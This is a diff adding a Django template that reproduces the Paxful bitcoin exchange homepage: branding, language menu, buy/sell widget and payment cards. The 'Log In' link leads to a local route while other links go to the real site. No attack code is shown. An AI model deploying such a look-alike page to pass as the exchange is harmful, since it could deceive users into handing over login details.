@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Buy and Sell Bitcoin Instantly  Paxful</title>
+  
+    <script defer src="https://use.fontawesome.com/releases/v5.0.7/js/all.js">
+
+    </script><meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <link rel="stylesheet" href="{% static 'css/style.css' %}"  type="text/css">
+    <link rel="stylesheet" href="{% static 'css/mdia.css' %}"  type="text/css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  </head>
+  <body>
+<div container-fluid>
+</div>
+<section>
+
+     
+    <section id="navbar" style="height: 104px;">
+    <div id="top-menu-navbar-container" class="d-block position-fixed bg-white MBgV5">
+      <div id="top-menu-navbar" class="container-fluid p-0">
+        <div class="position-relative d-flex align-items-center -mOEF">
+          <button type="button" class="c-hamburgerMenu d-xl-none mr-2 mr-sm-3 avxQ4">
+            <span class="c-hamburgerMenu__line mt-0"></span>
+            <span class="c-hamburgerMenu__line"></span>
+            <span class="c-hamburgerMenu__line"></span>
+          </button>
+            <a id="top-menu-button-home" href="/" class="d-block dark-theme-icon-disable">
+              <svg viewBox="0 0 123.7 23.3" xmlns="http://www.w3.org/2000/svg" fill="#333" class="position-relative dark-theme-icon-disable _4UREN" width="120">
+                <path d="M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z"></path>
+                <path d="M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z" fill="#00a5ef"></path>
+              </svg>
+            </a>
+                <nav class="_30jxx">
+                  <ul class="p-0 list-unstyled d-flex align-items-center _3eaCA justify-content-center">
+                    <li class="iSvZm d-none d-xl-block"><a id="top-menu-button-create-offer" class="btn btn-unstyled RaNhA" href="https://paxful.com/list-crypto-buy-sell-ad">Create an Offer</a></li>
+                    <li class="iSvZm d-none"><a class="btn btn-unstyled d-inline-block RaNhA" href="https://paxful.com/bitcoin-wallet">Wallet</a></li>
+                    <li class="iSvZm d-none d-lg-block">
+                      <button class=" gift" type="button">Gift Card Hub</button>
+                      <select name="drop" id="drop">
+                        
+                      </select>
+                                        </li>
+                                            <li class="iSvZm d-none d-lg-block">
+                                              <a id="top-menu-button-become-vendor" class="btn btn-unstyled RaNhA" href="https://paxful.com/vendors">Become a Vendor</a>
+                                            </li>
+                                      </ul>
+                                          </nav>
+                                          <div class="d-flex justify-content-end position-relative ml-auto rcQfE">
+                                            <div class="d-flex align-items-center">
+                                              <a id="top-menu-button-login" href="{% url 'register' %}" class="lh-16 font-weight-semibold text-gray-900 text-decoration-none qa-auth-button">Log In</a>
+                                              <a id="top-menu-button-register" href="https://paxful.com/register" class="d-xl-flex ml-3 btn btn-primary btn-md">Register</a>
+                                            </div>
+                                            <div class="d-none d-md-flex align-items-center">
+                                              <div class="d-block position-relative ffh7k _1X5xu dropdown">
+                                                <button type="button" id="top-menu-toggle-lang" aria-haspopup="true" aria-expanded="false" class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-default">
+                                                  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="text-gray-700">
+    
+   
+                                                                                              <path d="M16.4 14.4l-3-2c-.1-.1-.2-.1-.4-.1l-1.9-.1c-.2 0-.4.1-.6.2l-1.1 1.1c-.3.3-.3.6-.1.9l2 3c.1.2.4.3.6.3h3c.3 0 .5-.2.7-.4l1-2c.2-.3.1-.7-.2-.9zm-1.9 1.8h-2.1L11 14.1l.4-.4 1.4.1 2.2 1.5z"></path>
+                                                                                              <path d="M12 2.2c-5.4 0-9.8 4.4-9.8 9.8s4.4 9.8 9.8 9.8 9.8-4.4 9.8-9.8-4.4-9.8-9.8-9.8zm0 1.5c.4 0 .8 0 1.2.1l-.9 3.5-3.5 1c-.2 0-.4.2-.5.4l-.6 1.2-2.8-2.1C6.4 5.4 9 3.7 12 3.7zm0 16.5c-4.5 0-8.2-3.7-8.2-8.3 0-1 .2-2 .5-2.9l3.3 2.5c.1.1.3.1.4.1h.2c.2-.1.4-.2.5-.4l.8-1.7 3.7-.9c.3-.1.5-.3.5-.5l1-4c3.2 1.1 5.5 4.2 5.5 7.8 0 4.6-3.7 8.3-8.2 8.3z"></path>
+                                                                                            </svg>
+                                                                                          </button>
+                                                                                          <div tabindex="-1" role="menu" id="top-menu-dropdown-menu-lang" aria-hidden="true" class="rounded DropdownMenu-module_menu__2I4mi overflow-auto _1X5xu xW1-f dropdown-menu"><div class=""><div class="o2axn"><a href="/so/" class="dropdown-item b8rt6 d-inline-flex">af Soomaali</a><a href="/af/" class="dropdown-item b8rt6 d-inline-flex">Afrikaans</a><a href="/ig/" class="dropdown-item b8rt6 d-inline-flex">Ásụ̀sụ̀ Ìgbò</a><a href="/id/" class="dropdown-item b8rt6 d-inline-flex">Bahasa Indonesia</a><a href="/ms/" class="dropdown-item b8rt6 d-inline-flex">Bahasa Melayu</a>
+                                                                                            <a href="/cs/" class="dropdown-item b8rt6 d-inline-flex">Čeština</a>
+                                                                                            <a href="/da/" class="dropdown-item b8rt6 d-inline-flex">Dansk</a>
+                                                                                            <a href="/de/" class="dropdown-item b8rt6 d-inline-flex">Deutsch</a><a href="/yo/" class="dropdown-item b8rt6 d-inline-flex">Èdè Yorùbá</a><a href="/et/" class="dropdown-item b8rt6 d-inline-flex">Eesti</a><a href="/en/" class="dropdown-item b8rt6 d-inline-flex _4KXIY">English</a><a href="/es/" class="dropdown-item b8rt6 d-inline-flex">Español</a><a href="/fr/" class="dropdown-item b8rt6 d-inline-flex">Français</a><a href="/ha/" class="dropdown-item b8rt6 d-inline-flex">Hausa</a><a href="/xh/" class="dropdown-item b8rt6 d-inline-flex">isiXhosa</a><a href="/zu/" class="dropdown-item b8rt6 d-inline-flex">isiZulu</a><a href="/it/" class="dropdown-item b8rt6 d-inline-flex">Italiano</a><a href="/sw/" class="dropdown-item b8rt6 d-inline-flex">Kiswahili</a><a href="/lv/" class="dropdown-item b8rt6 d-inline-flex">Latviešu</a><a href="/lt/" class="dropdown-item b8rt6 d-inline-flex">Lietuvių</a><a href="/lg/" class="dropdown-item b8rt6 d-inline-flex">Luganda</a><a href="/hu/" class="dropdown-item b8rt6 d-inline-flex">Magyar</a><a href="/pcm/" class="dropdown-item b8rt6 d-inline-flex">Naija</a><a href="/nl/" class="dropdown-item b8rt6 d-inline-flex">Nederlands</a><a href="/nb/" class="dropdown-item b8rt6 d-inline-flex">Norsk Bokmål</a><a href="/pl/" class="dropdown-item b8rt6 d-inline-flex">Polski</a><a href="/pt/" class="dropdown-item b8rt6 d-inline-flex">Português</a><a href="/pt-br/" class="dropdown-item b8rt6 d-inline-flex">Português brasileiro</a><a href="/ro/" class="dropdown-item b8rt6 d-inline-flex">Română</a><a href="/sl/" class="dropdown-item b8rt6 d-inline-flex">Slovenščina</a><a href="/sr/" class="dropdown-item b8rt6 d-inline-flex">Srpski</a><a href="/fi/" class="dropdown-item b8rt6 d-inline-flex">Suomi</a><a href="/sv/" class="dropdown-item b8rt6 d-inline-flex">Svenska</a><a href="/tl/" class="dropdown-item b8rt6 d-inline-flex">Tagalog</a><a href="/vi/" class="dropdown-item b8rt6 d-inline-flex">Tiếng Việt</a><a href="/tr/" class="dropdown-item b8rt6 d-inline-flex">Türkçe</a><a href="/el/" class="dropdown-item b8rt6 d-inline-flex">Ελληνικά</a><a href="/bg/" class="dropdown-item b8rt6 d-inline-flex">Български</a><a href="/ru/" class="dropdown-item b8rt6 d-inline-flex">Русский</a><a href="/uk/" class="dropdown-item b8rt6 d-inline-flex">Українська</a><a href="/he/" class="dropdown-item b8rt6 d-inline-flex">עברית</a><a href="/ur/" class="dropdown-item b8rt6 d-inline-flex">اُردُو</a><a href="/ar/" class="dropdown-item b8rt6 d-inline-flex">العربيةُ</a><a href="/hi/" class="dropdown-item b8rt6 d-inline-flex">हिन्दी</a><a href="/kh/" class="dropdown-item b8rt6 d-inline-flex">ភាសាខ្មែរ</a><a href="/ko/" class="dropdown-item b8rt6 d-inline-flex">한국어</a><a href="/ja/" class="dropdown-item b8rt6 d-inline-flex">日本語</a><a href="/zh/" class="dropdown-item b8rt6 d-inline-flex">简体中文(SC)</a><a href="/zh-tw/" class="dropdown-item b8rt6 d-inline-flex">繁體中文(TC)</a>
+                                                                                          </div>
+                                                                                        </div>
+                                                                                      </div>
+                                                                                    </div></div></div></div></div></div>
+
+                                                                                            </section>
+                                                                                 
+
+<!-- <section id="navbar">
+  <div class="container">
+    <nav class="navbar navbar-expand-lg navbar-light ">
+      
+      <h3 id="top-menu-button-home" href="/" class="d-block dark-theme-icon-disable">
+        <svg viewBox="0 0 123.7 23.3" xmlns="http://www.w3.org/2000/svg" fill="#333" class="position-relative dark-theme-icon-disable _4UREN" width="120">
+          <path d="M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z"></path>
+          <path d="M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z" fill="#00a5ef"></path>
+        </svg>
+      </h3>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <nav class="_30jxx">
+          <ul class="p-0 list-unstyled d-flex align-items-center _3eaCA justify-content-center">
+            <li class="iSvZm d-none d-xl-block">
+              <a id="top-menu-button-create-offer" class="btn btn-unstyled RaNhA" href="https://paxful.com/list-crypto-buy-sell-ad">Create an Offer</a>
+            </li>
+            <li class="iSvZm">
+              <a class="btn btn-unstyled d-inline-block RaNhA" href="https://paxful.com/bitcoin-wallet">Wallet</a>
+            </li>
+            <li>
+              <button class=" gift" type="button">Gift Card Hub</button>
+              <select name="drop" id="drop"></select>
+            </li>
+            <li class="iSvZm d-none d-lg-block">
+              <a id="top-menu-button-become-vendor" class="btn btn-unstyled RaNhA" href="https://paxful.com/vendors">Become a Vendor</a>
+            </li>
+            <div class="d-flex justify-content-end position-relative ml-auto rcQfE">
+              <div class="d-flex align-items-center">
+                <a id="top-menu-button-login" href="{% url 'register' %}" class="lh-16 font-weight-semibold text-gray-900 text-decoration-none qa-auth-button">Log In</a>
+                <a id="top-menu-button-register" href="https://paxful.com/register" class="d-xl-flex ml-3 btn btn-primary btn-md">Register</a>
+              </div>
+              <div class="d-none d-md-flex align-items-center">
+                <div class="d-block position-relative ffh7k _1X5xu dropdown">
+                  <button type="button" id="top-menu-toggle-lang" aria-haspopup="true" aria-expanded="false" class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-default">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="text-gray-700">
+                    <path d="M16.4 14.4l-3-2c-.1-.1-.2-.1-.4-.1l-1.9-.1c-.2 0-.4.1-.6.2l-1.1 1.1c-.3.3-.3.6-.1.9l2 3c.1.2.4.3.6.3h3c.3 0 .5-.2.7-.4l1-2c.2-.3.1-.7-.2-.9zm-1.9 1.8h-2.1L11 14.1l.4-.4 1.4.1 2.2 1.5z"></path>
+                    <path d="M12 2.2c-5.4 0-9.8 4.4-9.8 9.8s4.4 9.8 9.8 9.8 9.8-4.4 9.8-9.8-4.4-9.8-9.8-9.8zm0 1.5c.4 0 .8 0 1.2.1l-.9 3.5-3.5 1c-.2 0-.4.2-.5.4l-.6 1.2-2.8-2.1C6.4 5.4 9 3.7 12 3.7zm0 16.5c-4.5 0-8.2-3.7-8.2-8.3 0-1 .2-2 .5-2.9l3.3 2.5c.1.1.3.1.4.1h.2c.2-.1.4-.2.5-.4l.8-1.7 3.7-.9c.3-.1.5-.3.5-.5l1-4c3.2 1.1 5.5 4.2 5.5 7.8 0 4.6-3.7 8.3-8.2 8.3z"></path></svg>
+                  </button>
+                  <div tabindex="-1" role="menu" id="top-menu-dropdown-menu-lang" aria-hidden="true" class="rounded DropdownMenu-module_menu__2I4mi overflow-auto _1X5xu xW1-f dropdown-menu">
+                    <div class="">
+                      <div class="o2axn">
+                        <a href="/so/" class="dropdown-item b8rt6 d-inline-flex">af Soomaali</a>
+                        <a href="/af/" class="dropdown-item b8rt6 d-inline-flex">Afrikaans</a>
+                        <a href="/ig/" class="dropdown-item b8rt6 d-inline-flex">Ásụ̀sụ̀ Ìgbò</a>
+                        <a href="/id/" class="dropdown-item b8rt6 d-inline-flex">Bahasa Indonesia</a>
+                        <a href="/ms/" class="dropdown-item b8rt6 d-inline-flex">Bahasa Melayu</a>
+                        <a href="/cs/" class="dropdown-item b8rt6 d-inline-flex">Čeština</a>
+                        <a href="/da/" class="dropdown-item b8rt6 d-inline-flex">Dansk</a>
+                        <a href="/de/" class="dropdown-item b8rt6 d-inline-flex">Deutsch</a>
+                        <a href="/yo/" class="dropdown-item b8rt6 d-inline-flex">Èdè Yorùbá</a>
+                        <a href="/et/" class="dropdown-item b8rt6 d-inline-flex">Eesti</a>
+                        <a href="/en/" class="dropdown-item b8rt6 d-inline-flex _4KXIY">English</a>
+                        <a href="/es/" class="dropdown-item b8rt6 d-inline-flex">Español</a>
+                        <a href="/fr/" class="dropdown-item b8rt6 d-inline-flex">Français</a>
+                        <a href="/ha/" class="dropdown-item b8rt6 d-inline-flex">Hausa</a>
+                        <a href="/xh/" class="dropdown-item b8rt6 d-inline-flex">isiXhosa</a>
+                        <a href="/zu/" class="dropdown-item b8rt6 d-inline-flex">isiZulu</a>
+                        <a href="/it/" class="dropdown-item b8rt6 d-inline-flex">Italiano</a>
+                        <a href="/sw/" class="dropdown-item b8rt6 d-inline-flex">Kiswahili</a>
+                        <a href="/lv/" class="dropdown-item b8rt6 d-inline-flex">Latviešu</a><a href="/lt/" class="dropdown-item b8rt6 d-inline-flex">Lietuvių</a><a href="/lg/" class="dropdown-item b8rt6 d-inline-flex">Luganda</a><a href="/hu/" class="dropdown-item b8rt6 d-inline-flex">Magyar</a><a href="/pcm/" class="dropdown-item b8rt6 d-inline-flex">Naija</a><a href="/nl/" class="dropdown-item b8rt6 d-inline-flex">Nederlands</a><a href="/nb/" class="dropdown-item b8rt6 d-inline-flex">Norsk Bokmål</a><a href="/pl/" class="dropdown-item b8rt6 d-inline-flex">Polski</a><a href="/pt/" class="dropdown-item b8rt6 d-inline-flex">Português</a><a href="/pt-br/" class="dropdown-item b8rt6 d-inline-flex">Português brasileiro</a><a href="/ro/" class="dropdown-item b8rt6 d-inline-flex">Română</a><a href="/sl/" class="dropdown-item b8rt6 d-inline-flex">Slovenščina</a><a href="/sr/" class="dropdown-item b8rt6 d-inline-flex">Srpski</a><a href="/fi/" class="dropdown-item b8rt6 d-inline-flex">Suomi</a><a href="/sv/" class="dropdown-item b8rt6 d-inline-flex">Svenska</a><a href="/tl/" class="dropdown-item b8rt6 d-inline-flex">Tagalog</a><a href="/vi/" class="dropdown-item b8rt6 d-inline-flex">Tiếng Việt</a><a href="/tr/" class="dropdown-item b8rt6 d-inline-flex">Türkçe</a><a href="/el/" class="dropdown-item b8rt6 d-inline-flex">Ελληνικά</a><a href="/bg/" class="dropdown-item b8rt6 d-inline-flex">Български</a><a href="/ru/" class="dropdown-item b8rt6 d-inline-flex">Русский</a><a href="/uk/" class="dropdown-item b8rt6 d-inline-flex">Українська</a><a href="/he/" class="dropdown-item b8rt6 d-inline-flex">עברית</a><a href="/ur/" class="dropdown-item b8rt6 d-inline-flex">اُردُو</a><a href="/ar/" class="dropdown-item b8rt6 d-inline-flex">العربيةُ</a><a href="/hi/" class="dropdown-item b8rt6 d-inline-flex">हिन्दी</a><a href="/kh/" class="dropdown-item b8rt6 d-inline-flex">ភាសាខ្មែរ</a><a href="/ko/" class="dropdown-item b8rt6 d-inline-flex">한국어</a><a href="/ja/" class="dropdown-item b8rt6 d-inline-flex">日本語</a><a href="/zh/" class="dropdown-item b8rt6 d-inline-flex">简体中文(SC)</a><a href="/zh-tw/" class="dropdown-item b8rt6 d-inline-flex">繁體中文(TC)</a>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </ul>
+        </nav>
+     
+      </div>
+    </nav>
+  </div>
+</section>   -->
+
+<section>
+
+      <div class="header">
+        
+        <div class="heading">
+          <h1 class="rlKNN text-white mb-2 mb-xs-2 mx-0 mx-sm-auto mx-lg-0 h3">Trade Bitcoin with Paxful.</h1>
+          <div class="fCdWc">Join the leading peer-to-peer platform to buy and sell Bitcoin using 350+ payment methods with 10 million people just like you.</div>
+          </div>
+
+
+        
+        <div class="box">
+            <div class="header-content">
+                    <button type="button" class="btn btn-primary butt">Buy</button>
+                    <button type="button" class="btn btn-light butt1">Sell</button><br>
+                    
+            
+                  <button type="button" class="d-flex align-items-center btn-square btn btn-light btn-lg btn-block">
+                    <img src="https://paxful.com/assets/icons/48/bitcoin.svg" alt="BTC" class="dark-theme-icon-disable mr-2 icon-16">
+                    <span class="d-block text-left w-100 text-truncate font-weight-normal">Bitcoin</span>
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="text-gray-500 flex-shrink-0">
+                      <path fill-rule="evenodd" d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z" clip-rule="evenodd"></path>
+                    </svg>
+                  </button>
+                  <div class="position-relative">
+                    <div class="ml-0 mt-2 w-100 text-left position-absolute">
+                      <div class="_3rpmn">
+                        <div class="_65T61 css-2b097c-container">
+                          <div class="p4Aly mt-2 pb-2 css-0">
+                            <div class="px-2 _5HQUI select-scroll-container css-0">
+                              <div class=" css-0" id="react-select-2-option-0" tabindex="-1">
+                                <button class="d-flex justify-content-between border-0 font-weight-normal p-2 mb-0_5 bg-blue-100 btn btn-light btn-lg btn-block">
+                                  <div class="d-flex flex-row">
+                                    <img src="https://paxful.com/assets/icons/48/bitcoin.svg" alt="BTC" class="dark-theme-icon-disable mr-2 icon-24">
+                                    <span>Bitcoin</span>
+                                  </div>
+                                  <span class="tag tag--md tag-transparent border-gray-400">BTC</span></button></div><div class=" css-0" id="react-select-2-option-1" tabindex="-1"><button class="d-flex justify-content-between border-0 font-weight-normal p-2 mb-0_5 btn btn-light btn-lg btn-block"><div class="d-flex flex-row"><img src="https://paxful.com/assets/icons/48/tether.svg" alt="USDT" class="dark-theme-icon-disable mr-2 icon-24"><span>Tether</span></div><span class="tag tag--md tag-transparent border-gray-400">USDT</span></button></div><div class=" css-0" id="react-select-2-option-2" tabindex="-1"><button class="d-flex justify-content-between border-0 font-weight-normal p-2 mb-0_5 btn btn-light btn-lg btn-block"><div class="d-flex flex-row"><img src="https://paxful.com/assets/icons/48/ethereum.svg" alt="ETH" class="dark-theme-icon-disable mr-2 icon-24"><span>Ethereum</span></div><span class="tag tag--md tag-transparent border-gray-400">ETH</span></button></div><div class=" css-0" id="react-select-2-option-3" tabindex="-1"><button class="d-flex justify-content-between border-0 font-weight-normal p-2 mb-0_5 btn btn-light btn-lg btn-block"><div class="d-flex flex-row"><img src="https://paxful.com/assets/icons/48/usd-coin.svg" alt="USDC" class="dark-theme-icon-disable mr-2 icon-24"><span>USD Coin</span></div><span class="tag tag--md tag-transparent border-gray-400">USDC</span></button></div></div></div></div></div></div></div>
+                  
+                      <br>
+                    <div id="main-widget-payment-method-selector" class="mb-3">
+                      <label class="">Pay with</label>
+                      <div class="d-flex align-items-center justify-content-between form-control mb-1 bg-white form-control__disabled">
+                        <input readonly="" data-cy="paymentMethodsField" type="text" class="min-width-0 border-transparent py-0 cursor-pointer bg-white form-control" value="Select payment method (350+)">
+                        <div class="fresnel-container fresnel-lessThan-sm "></div>
+                        <div class="fresnel-container fresnel-greaterThanOrEqual-sm ">
+                          <button type="button" data-cy="paymentMethodsBtn" class="text-nowrap btn btn-outline-primary btn-md">Show All</button>
+                        </div>
+                      </div>
+                      <div class="mt-2">
+                        <div class="scrollable__wrapper">
+                          <div class="scrollable__container">
+                            <div class="d-flex flex-row">
+                              <button type="button" class="mr-2 label-sm flex-shrink-0 btn btn-default btn-sm">Bank Transfer</button>
+                              <button type="button" class="mr-2 label-sm flex-shrink-0 btn btn-default btn-sm">PayPal</button>
+                              <button type="button" class="mr-2 label-sm flex-shrink-0 btn btn-default btn-sm">Amazon Gift Card</button>
+                              <button type="button" class="mr-2 label-sm flex-shrink-0 btn btn-default btn-sm">Steam Wallet Gift Card</button>
+                              <button type="button" class="mr-2 label-sm flex-shrink-0 btn btn-default btn-sm">iTunes Gift Card</button></div>
+                            </div>
+                            <button type="button" data-button-type="END" class="ScrollButton-module_button__1XyJ_ mt-n1 j4DrD ScrollButton-module_end__3x55M btn-square btn btn-default btn-md">
+                              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="ScrollButton-module_arrow__23Q2I">
+                                <path d="M9 18.8c-.2 0-.4-.1-.5-.2-.3-.3-.3-.8 0-1.1L14 12 8.5 6.5c-.3-.3-.3-.8 0-1.1s.8-.3 1.1 0l6 6c.3.3.3.8 0 1.1l-6 6c-.2.2-.4.3-.6.3z"></path>
+                              </svg>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                    
+                    <form class="w-100">
+                          <div>
+                          <label class="">I want to spend</label>
+                          <div>
+                            <div class="d-flex align-items-center justify-content-between form-control">
+                              <input inputmode="decimal" id="mainWidgetForm_AmountYouPay_Field" placeholder="Enter amount" data-cy="currencyAmountField" type="text" class="min-width-0 border-transparent py-0 wTUGR form-control" value="">
+                              <div class="fresnel-container fresnel-lessThan-sm ">
+
+                              </div>
+                              <div class="fresnel-container fresnel-greaterThanOrEqual-sm ">
+                                <button type="button" data-cy="currencyPickerBtn" class="_0nTtV btn btn-outline-primary btn-md">
+                                  <div class="d-flex align-items-center text-nowrap" data-cy="currencyPickerBtnText">USD<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="flex-shrink-0 ml-1 ml-xs-2_5 _7jVIO">
+                                    <path fill-rule="evenodd" d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z" clip-rule="evenodd"></path>
+                                  </svg>
+                                </div>
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+                          <div class="fresnel-container fresnel-lessThan-sm ">
+
+                          </div>
+                        <div class="mb-3 mt-1 text-gray-600">
+                          <span>Minimum: 10 USD</span>
+                        </div>
+                      </div>
+                      <button type="submit" data-cy="findOffersBtn" class="text-center btn btn-primary btn-lg btn-block">Find Offers</button>
+                    </form>
+            
+              
+             </div>
+          </div>
+        </div>
+  </section>
+
+    <section id="mid">
+      <div class="container">
+            <div class="midi">
+              
+            <h2>Over 350 ways to buy and sell <br>Bitcoin.</h2>
+            <p>Explore our Marketplace and start trading with your favorite payment methods or discover something new.</p>
+            <div class="btn-group btn-group-toggle d-flex d-md-inline-flex mb-4 mb-md-5">
+              <button type="button" class="mr-md-2 Id20r btn btn-underline btn-md">Sell Bitcoin</button>
+              <button type="button" class="ml-md-2 btn btn-underline btn-md">Buy Bitcoin</button>
+              
+            </div>
+            <hr>
+          </div>
+          <div class="wallets">
+           
+              <div id="homeSellWays" class="row">
+                <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-12">
+                  <a href="https://paxful.com/sell-bitcoin?group=bank-transfers&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                    <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                        <path fill="var(--icons-bg-fill, #ffffff)" d="M9 19h6v19H9V19zm12 0h6v19h-6V19zm12 0h6v19h-6V19z"></path>
+                        <path fill="#00A5EF" fill-opacity="0.2" d="M9 19h6v19H9V19z"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M8 18h8v21H8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path>
+                        <path fill="#00A5EF" fill-opacity="0.2" d="M33 19h6v19h-6V19z"></path><path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M32 18h8v21h-8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path>
+                        <path fill="#00A5EF" fill-opacity="0.2" d="M21 19h6v19h-6V19z"></path>
+                        <path fill="var(--icons-primary, #0097db)" fill-rule="evenodd" d="M20 18h8v21h-8V18zm2 2v17h4V20h-4z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M8 37a3 3 0 00-3 3v1a3 3 0 00-3 3v2h2v-2a1 1 0 011-1h38a1 1 0 011 1v2h2v-2a3 3 0 00-3-3v-1a3 3 0 00-3-3H8zm33 4v-1a1 1 0 00-1-1H8a1 1 0 00-1 1v1h34z" clip-rule="evenodd"></path><path fill="var(--icons-secondary, #454c59)" d="M8 19h8v3H8zm12 0h8v3h-8zm12 0h8v3h-8z" opacity="0.15"></path><path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M22.235 3.047a3 3 0 013.53 0L44.1 16.383c1.567 1.139.76 3.617-1.176 3.617H5.075c-1.937 0-2.743-2.478-1.176-3.617L22.235 3.047zm2.353 1.617a1 1 0 00-1.176 0L5.075 18h37.85L24.588 4.664z" clip-rule="evenodd"></path>
+                      </svg><strong class="d-block h4 ml-3 ml-md-0 mb-0 mb-sm-1">Bank transfer</strong>
+                    </div>
+                    <p class="mt-1 mb-0 regular-18 d-none d-sm-block">Our guided bank transfer trades make it even easier to sell Bitcoin and receive payment.</p>
+                  </a>
+                </div>
+                <div class="col-md-6 col-lg-4 col-sm-12 mb-2 mb-sm-4">
+                  <a href="https://paxful.com/sell-bitcoin?group=cash-deposits&amp;hasScroll=true" data-page="Home" class="h-100 actionsBoard__card card p-3 p-md-4 flex-grow d-flex text-dark text-left">
+                    <div class="d-flex flex-row flex-md-column align-items-center align-items-md-start">
+                      <svg width="48" height="48" fill="none" viewBox="0 0 48 48" class="mb-sm-2 icon-multicolor">
+                        <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M10 23a3 3 0 013-3h32a3 3 0 013 3v16a3 3 0 01-3 3H13a3 3 0 01-3-3V23zm3-1a1 1 0 00-1 1v16a1 1 0 001 1h32a1 1 0 001-1V23a1 1 0 00-1-1H13z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" fill-rule="evenodd" d="M29 34a3 3 0 100-6 3 3 0 000 6zm0 2a5 5 0 100-10 5 5 0 000 10z" clip-rule="evenodd"></path>
+                        <path fill="var(--icons-secondary, #454c59)" d="M10 18a2 2 0 012-2h28a2 2 0 012 2v13a2 2 0 01-2 2H10V18z" opacity="0.15"></path>
